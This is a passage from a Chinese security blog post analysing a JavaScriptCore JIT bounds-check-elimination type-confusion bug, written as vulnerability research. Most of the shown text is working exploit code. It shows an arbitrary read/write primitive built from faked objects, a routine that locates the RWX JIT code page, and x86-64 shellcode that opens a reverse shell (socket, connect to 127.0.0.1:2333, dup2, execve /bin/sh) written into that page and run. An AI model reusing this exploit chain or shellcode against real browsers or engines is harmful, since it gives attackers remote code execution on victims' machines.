NewAddressOf(victim.prop);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function write64(addr_l,addr_h,double_val) &#123;</span><br><span class="line">   hax[1] = NewFakeObject(addr_l + 0x10,addr_h);</span><br><span class="line">   victim.prop = double_val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="劫持JIT编译的代码"><a href="#劫持JIT编译的代码" class="headerlink" title="劫持JIT编译的代码"></a>劫持JIT编译的代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">var shellcodeFunc = getJITFunction();</span><br><span class="line">shellcodeFunc();</span><br><span class="line">var shellcodeFunc_addr = NewAddressOf(shellcodeFunc);</span><br><span class="line">var executable_base_addr = read64(shellcodeFunc_addr[0] + 0x18,shellcodeFunc_addr[1]);</span><br><span class="line"></span><br><span class="line">var jit_code_addr = read64(executable_base_addr[0] + 0x8,executable_base_addr[1]);</span><br><span class="line">var rwx_addr = read64(jit_code_addr[0] + 0x20,jit_code_addr[1]);</span><br><span class="line">debug(&quot;[+] shellcodeFunc_addr=&quot; + shellcodeFunc_addr[1].toString(16) + shellcodeFunc_addr[0].toString(16));</span><br><span class="line"></span><br><span class="line">debug(&quot;[+] executable_base_addr=&quot; + executable_base_addr[1].toString(16) + executable_base_addr[0].toString(16));</span><br><span class="line">debug(&quot;[+] jit_code_addr=&quot; + jit_code_addr[1].toString(16) + jit_code_addr[0].toString(16));</span><br><span class="line">debug(&quot;[+] rwx_addr=&quot; + rwx_addr[1].toString(16) + rwx_addr[0].toString(16));</span><br><span class="line"></span><br><span class="line">const shellcode = [</span><br><span class="line">	0x31, 0xD2, 0x31, 0xF6, 0x40, 0xB6, 0x01, 0x31, 0xFF, 0x40, 0xB7, 0x02, 0x31, 0xC0, 0xB0, 0x29,</span><br><span class="line">	0x0F, 0x05, 0x89, 0x44, 0x24, 0xF8, 0x89, 0xC7, 0x48, 0xB8, 0x02, 0x00, 0x09, 0x1D, 0x7F, 0x00,</span><br><span class="line">	0x00, 0x01, 0x48, 0x89, 0x04, 0x24, 0x48, 0x89, 0xE6, 0xB2, 0x10, 0x48, 0x31, 0xC0, 0xB0, 0x2A,</span><br><span class="line">	0x0F, 0x05, 0x8B, 0x7C, 0x24, 0xF8, 0x31, 0xF6, 0xB0, 0x21, 0x0F, 0x05, 0x40, 0xB6, 0x01, 0x8B,</span><br><span class="line">	0x7C, 0x24, 0xF8, 0xB0, 0x21, 0x0F, 0x05, 0x40, 0xB6, 0x02, 0x8B, 0x7C, 0x24, 0xF8, 0xB0, 0x21,</span><br><span class="line">	0x0F, 0x05, 0x48, 0xB8, 0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x73, 0x68, 0x00, 0x48, 0x89, 0x44, 0x24,</span><br><span class="line">	0xF0, 0x48, 0x31, 0xF6, 0x48, 0x31, 0xD2, 0x48, 0x8D, 0x7C, 0x24, 0xF0, 0x48, 0x31, 0xC0, 0xB0,</span><br><span class="line">	0x3B, 0x0F, 0x05</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">function ByteToDwordArray(payload)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    let sc = []</span><br><span class="line">    let tmp = 0;</span><br><span class="line">    let len = Math.ceil(payload.length/6)</span><br><span class="line">    for (let i = 0; i &lt; len; i += 1) &#123;</span><br><span class="line">        tmp = 0;</span><br><span class="line">        pow = 1;</span><br><span class="line">        for(let j=0; j&lt;6; j++)&#123;</span><br><span class="line">            let c = payload[i*6+j]</span><br><span class="line">            if(c === undefined) &#123;</span><br><span class="line">                c = 0;</span><br><span class="line">            &#125;</span><br><span class="line">            pow = j==0 ? 1 : 256 * pow;</span><br><span class="line">            tmp += c * pow;</span><br><span class="line">        &#125;</span><br><span class="line">        tmp += 0xc000000000000;</span><br><span class="line">        sc.push(tmp);</span><br><span class="line">    &#125;</span><br><span class="line">    return sc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//debug(describe(shellcodeFunc));</span><br><span class="line"></span><br><span class="line">//debug(shellcode.length);</span><br><span class="line">//替换jit的shellcode</span><br><span class="line">let sc = ByteToDwordArray(shellcode);</span><br><span class="line">for(let i=0; i&lt;sc.length; i++) &#123;</span><br><span class="line">   write64(rwx_addr[0] + i*6,rwx_addr[1],i2f(sc[i]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">debug(&quot;trigger shellcode&quot;)</span><br><span class="line">//执行shellcode</span><br><span class="line">print();</span><br><span class="line">shellcodeFunc();</span><br><span class="line"></span><br><span class="line">print();</span><br></pre></td></tr></table></figure>
<p>这里，我们使用<code>ByteToDwordArray</code>将shellcode转为6字节有效数据每个的数组，这样是为了在write64时能一次写入6个有效数据，减少<code>for(let i=0; i&lt;sc.length; i++)</code>的次数，避免<code>write64</code>被JIT编译，否则会报错崩溃，原因是因为我们伪造的对象未通过编译时的某些检查，但这不影响我们漏洞利用。<br>结果展示<br><img src="https://p5.ssl.qhimg.com/t014b102d096c86088c.png"></p>
<h2 id="0x03-感想"><a href="#0x03-感想" class="headerlink" title="0x03 感想"></a>0x03 感想</h2><p>通过本次研究学习，理解了JSC的边界检查消除机制，同时也对JSC中的CSE有了一些了解，其与V8之间也非常的相似。</p>
<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/223494#h3-7">FireShell2020——从一道ctf题入门jsc利用</a><br><a target="_blank" rel="noopener" href="https://git.webkit.org/?p=WebKit.git;a=commitdiff;h=951d27d5ba08b6c29370b05dc6b4ffe18be1ca18;hp=385e9bf9c686204d148574362b5c3da3b5319314">WebKit Commitdiff</a><br><a target="_blank" rel="noopener" href="https://i.blackhat.com/eu-19/Thursday/eu-19-Wang-Thinking-Outside-The-JIT-Compiler-Understanding-And-Bypassing-StructureID-Randomization-With-Generic-And-Old-School-Methods.pdf">eu-19-Wang-Thinking-Outside-The-JIT-Compiler-Understanding-And-Bypassing-StructureID-Randomization-With-Generic-And-Old-School-Methods</a><br><a target="_blank" rel="noopener" href="https://www.sohu.com/a/468929360_120622013">JITSploitation I：JIT编译器漏洞分析 </a><br><a target="_blank" rel="noopener" href="https://googleprojectzero.blogspot.com/2020/09/jitsploitation-one.html">Project Zero: JITSploitation I: A JIT Bug</a></p>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/JS%E5%BC%95%E6%93%8E%E6%BC%8F%E6%B4%9E/" rel="tag"># JS引擎漏洞</a>
              <a href="/tags/%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86/" rel="tag"># 类型混淆</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2021/06/21/CVE-2018-4233/" rel="prev" title="Pwn2Own 2018 CVE-2018-4233 分析">
      <i class="fa fa-chevron-left"></i> Pwn2Own 2018 CVE-2018-4233 分析
    </a></div>
      <div class="post-nav-item">
    <a href="/2021/08/05/issues-1076708/" rel="next" title="Issues-1076708 漏洞分析">
      Issues-1076708 漏洞分析 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">0x00 前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">2.</span> <span class="nav-text">0x01 前置知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#CSE"><span class="nav-number">2.1.</span> <span class="nav-text">CSE</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BE%B9%E7%95%8C%E6%A3%80%E6%9F%A5%E6%B6%88%E9%99%A4"><span class="nav-number">2.2.</span> <span class="nav-text">边界检查消除</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%88%A9%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">0x02 漏洞分析利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#patch%E5%88%86%E6%9E%90"><span class="nav-number">3.1.</span> <span class="nav-text">patch分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#POC%E6%9E%84%E9%80%A0"><span class="nav-number">3.2.</span> <span class="nav-text">POC构造</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#OOB%E6%95%B0%E7%BB%84%E6%9E%84%E9%80%A0"><span class="nav-number">3.3.</span> <span class="nav-text">OOB数组构造</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%84%E9%9C%B2StructureID"><span class="nav-number">3.4.</span> <span class="nav-text">泄露StructureID</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#getByVal"><span class="nav-number">3.4.1.</span> <span class="nav-text">getByVal</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Function-prototype-toString-call"><span class="nav-number">3.4.2.</span> <span class="nav-text">Function.prototype.toString.call</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80%E8%AF%BB%E5%86%99%E5%8E%9F%E8%AF%AD"><span class="nav-number">3.5.</span> <span class="nav-text">任意地址读写原语</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8A%AB%E6%8C%81JIT%E7%BC%96%E8%AF%91%E7%9A%84%E4%BB%A3%E7%A0%81"><span class="nav-number">3.6.</span> <span class="nav-text">劫持JIT编译的代码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E6%84%9F%E6%83%B3"><span class="nav-number">4.</span> <span class="nav-text">0x03 感想</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E5%8F%82%E8%80%83"><span class="nav-number">5.</span> <span class="nav-text">0x04 参考</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">ha1vk</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">234</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">4</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">147</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">ha1vk</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>


        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

</body>
</html>
